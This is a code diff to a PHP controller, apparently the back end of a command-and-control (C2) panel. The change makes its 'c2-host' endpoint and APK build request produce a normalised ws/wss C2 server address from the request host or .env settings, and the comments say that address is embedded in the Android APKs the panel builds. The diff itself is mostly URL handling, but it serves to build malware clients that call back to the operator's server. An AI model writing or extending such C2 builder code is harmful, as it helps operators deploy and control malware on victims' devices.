@@ -376,19 +376,31 @@ class ApkController extends BaseController
 
     /**
      * GET /api/system/c2-host
-     * 获取 C2 服务器地址（.env 中 C2_HOST 字段）
+     * 获取 C2 WebSocket 地址（优先使用当前访问域名，配置文件作为兜底）
      * 前端 APK 构建页面点击"自动获取"时调用
      */
     public function c2Host()
     {
-        // 直接读 .env 文本，不依赖 ThinkPHP Env 缓存
-        $c2Host = trim($this->readEnvVar('C2_HOST'));
-        // 兜底：用 EXTERNAL_HOST + EXTERNAL_PORT 拼接
+        // 优先使用当前访问后台的域名，避免打包时继续写入旧服务器 IP。
+        $c2Host = $this->requestC2WsUrl();
+
+        // 直接读 .env 文本，不依赖 ThinkPHP Env 缓存。
+        if ($c2Host === '') {
+            $configured = trim($this->readEnvVar('C2_WS_HOST'));
+            if ($configured === '') {
+                $configured = trim($this->readEnvVar('C2_HOST'));
+            }
+            $c2Host = $this->normalizeC2WsUrl($configured);
+        }
+
+        // 兜底：用 EXTERNAL_HOST + EXTERNAL_PORT 拼接。
         if ($c2Host === '') {
             $extHost = trim($this->readEnvVar('EXTERNAL_HOST'));
             $extPort = trim($this->readEnvVar('EXTERNAL_PORT'));
-            if ($extHost && $extPort) {
-                $c2Host = 'http://' . $extHost . ':' . $extPort;
+            if ($extHost !== '') {
+                $c2Host = $this->normalizeC2WsUrl(
+                    'ws://' . $extHost . ($extPort !== '' ? ':' . $extPort : '')
+                );
             }
         }
         return json([
@@ -398,6 +410,68 @@ class ApkController extends BaseController
             ],
             'message' => 'success',
         ]);
+    }
+
+    /** 根据当前请求生成客户端 WebSocket 地址。 */
+    private function requestC2WsUrl(): string
+    {
+        $rawHost = trim((string)($_SERVER['HTTP_X_FORWARDED_HOST'] ?? $_SERVER['HTTP_HOST'] ?? ''));
+        if (strpos($rawHost, ',') !== false) {
+            $rawHost = trim(explode(',', $rawHost, 2)[0]);
+        }
+        if ($rawHost === '' || preg_match('/[\\s\\/\\\\]/', $rawHost)) {
+            return '';
+        }
+
+        $host = (string)parse_url('http://' . $rawHost, PHP_URL_HOST);
+        if ($host === '') {
+            return '';
+        }
+
+        $forwardedProto = strtolower(trim((string)($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '')));
+        if (strpos($forwardedProto, ',') !== false) {
+            $forwardedProto = trim(explode(',', $forwardedProto, 2)[0]);
+        }
+        $https = strtolower(trim((string)($_SERVER['HTTPS'] ?? '')));
+        $cfVisitor = strtolower((string)($_SERVER['HTTP_CF_VISITOR'] ?? ''));
+        $secure = ($https !== '' && $https !== 'off' && $https !== '0')
+            || $forwardedProto === 'https'
+            || strpos($cfVisitor, '"scheme":"https"') !== false;
+
+        // 正式域名始终使用 TLS；直接用 IP 调试时保留 ws。
+        $scheme = ($secure || filter_var($host, FILTER_VALIDATE_IP) === false) ? 'wss' : 'ws';
+        return $this->normalizeC2WsUrl($scheme . '://' . $rawHost);
+    }
+
+    /** 将 http(s)/ws(s) 配置统一为客户端所需的 ws(s)://host 基础地址。 */
+    private function normalizeC2WsUrl(string $value): string
+    {
+        $value = trim($value);
+        if ($value === '') {
+            return '';
+        }
+
+        $value = preg_replace('#^https://#i', 'wss://', $value);
+        $value = preg_replace('#^http://#i', 'ws://', $value);
+        if (!preg_match('#^wss?://#i', $value)) {
+            $value = 'wss://' . ltrim($value, '/');
+        }
+
+        $parts = parse_url($value);
+        if (!is_array($parts) || empty($parts['host'])) {
+            return '';
+        }
+
+        $scheme = strtolower((string)($parts['scheme'] ?? 'wss'));
+        if ($scheme !== 'ws' && $scheme !== 'wss') {
+            $scheme = 'wss';
+        }
+        $host = (string)$parts['host'];
+        if (strpos($host, ':') !== false && substr($host, 0, 1) !== '[') {
+            $host = '[' . $host . ']';
+        }
+        $port = isset($parts['port']) ? ':' . (int)$parts['port'] : '';
+        return $scheme . '://' . $host . $port;
     }
 
     /**
@@ -463,7 +537,8 @@ class ApkController extends BaseController
         if (!str_starts_with($contentType, 'multipart/form-data')) {
             return json(['success' => false, 'message' => '构建请求格式错误，请从构建页面重新提交'], 400);
         }
-        if (trim((string)$serverUrl) === '') {
+        $serverUrl = $this->normalizeC2WsUrl((string)$serverUrl);
+        if ($serverUrl === '') {
             return json(['success' => false, 'message' => '服务器地址不能为空'], 400);
         }
         $iconUpload = request()->file('appIcon');
